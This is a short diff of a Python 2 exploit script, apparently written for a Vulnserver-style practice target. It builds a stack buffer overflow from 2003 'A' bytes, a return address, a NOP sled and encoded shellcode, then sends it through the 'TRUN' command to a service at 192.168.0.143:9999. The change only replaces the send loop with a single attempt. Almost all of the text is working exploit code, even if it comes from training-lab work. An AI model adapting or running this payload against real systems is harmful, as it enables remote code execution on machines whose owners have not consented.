@@ -48,13 +48,13 @@ overflow = ("\xbf\xaf\x60\xec\xd8\xda\xde\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
 
 shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
 
-while True:
-    try:
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(('192.168.0.143',9999))
-        s.send(('TRUN /.:/' + shellcode))
-        s.close
 
-    except:
-        print "Error connecting to server"
-        sys.exit()
+try:
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(('192.168.0.143',9999))
+    s.send(('TRUN /.:/' + shellcode))
+    s.close
+
+except:
+    print "Error connecting to server"
+    sys.exit()
